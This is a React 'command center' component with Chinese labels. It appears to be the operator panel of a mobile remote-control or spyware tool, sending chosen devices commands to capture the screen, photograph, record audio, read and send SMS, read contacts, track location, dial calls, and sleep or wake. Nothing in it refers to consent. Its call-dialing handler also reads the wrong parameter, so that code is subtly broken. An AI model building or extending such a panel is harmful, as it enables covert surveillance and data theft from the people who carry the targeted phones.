import React, { useState } from 'react';

const commandTemplates = [
  { command: 'CAPTURE_SCREEN', desc: '截屏', params: {} },
  { command: 'CAPTURE_PHOTO', desc: '拍照', params: {} },
  { command: 'START_RECORDING', desc: '录音', params: {} },
  { command: 'SEND_SMS', desc: '发送短信', params: { phone: '', message: '' } },
  { command: 'GET_LOCATION', desc: '获取位置', params: {} },
  { command: 'LIST_APPS', desc: '获取应用列表', params: {} },
  { command: 'READ_CONTACTS', desc: '读取联系人', params: {} },
  { command: 'READ_SMS', desc: '读取短信', params: {} },
  { command: 'DIAL_CALL', desc: '拨打电话', params: { number: '' } },
  { command: 'SLEEP', desc: '休眠', params: { duration: 3600 } },
  { command: 'WAKE', desc: '唤醒', params: {} },
];

function CommandCenter({ onCommand, devices, onCommandSend }) {
  const [selectedDevice, setSelectedDevice] = useState('');
  const [selectedCommand, setSelectedCommand] = useState(commandTemplates[0]);
  const [params, setParams] = useState({});

  const handleSendCommand = async () => {
    if (!selectedDevice) {
      alert('请先选择设备');
      return;
    }

    const command = selectedCommand.command;
    const paramsToSend = { ...selectedCommand.params, ...params };

    if (selectedCommand.command === 'SEND_SMS') {
      paramsToSend.phone = params.phone || paramsToSend.phone;
      paramsToSend.message = params.message || paramsToSend.message;
    }

    if (selectedCommand.command === 'DIAL_CALL') {
      paramsToSend.number = params.phone || paramsToSend.number;
    }

    await onCommandSend(selectedDevice, command, paramsToSend);
    alert(`指令已发送: ${command}`);
  };

  return (
    <div className="command-center">
      <h2>指令中心</h2>
      <div>
        <select
          value={selectedDevice}
          onChange={(e) => setSelectedDevice(e.target.value)}
          style={{ padding: '10px', fontSize: '16px' }}
        >
          <option value="">-- 选择设备 --</option>
          {devices.map(device => {
            const [id, device_id, device_name] = device;
            return <option key={device_id} value={device_id}>{device_name || device_id}</option>;
          })}
        </select>
      </div>

      <div style={{ marginTop: '20px' }}>
        <select
          value={selectedCommand.command}
          onChange={(e) => {
          const cmd = commandTemplates.find(c => c.command === e.target.value);
          setSelectedCommand(cmd || selectedCommand);
          setParams(cmd.params);
        }}
          style={{ padding: '10px', fontSize: '16px', width: '100%' }}
        >
          <option value="">-- 选择指令 --</option>
          {commandTemplates.map(cmd => (
            <option key={cmd.command} value={cmd.command}>
              {cmd.desc} ({cmd.command})
            </option>
          ))}
        </select>
      </div>

      {Object.keys(selectedCommand.params).length > 0 && (
        <div className="command-form">
          {Object.keys(selectedCommand.params).map(key => (
            <input
              key={key}
              type={key === 'duration' ? 'number' : 'text'}
              placeholder={key}
              value={params[key] || ''}
              onChange={(e) => setParams({ ...params, [key]: e.target.value })}
              style={{ padding: '10px', flex: '1' }}
            />
          ))}
        </div>
      )}

      <button
        onClick={handleSendCommand}
        style={{
          marginTop: '20px',
          padding: '15px 30px',
          fontSize: '18px',
          background: '#00ff00',
          color: '#000',
          border: 'none',
          borderRadius: '10px',
          cursor: 'pointer',
          fontWeight: 'bold'
        }}
      >
        🚀 发送指令
      </button>
    </div>
  );
}

export default CommandCenter;
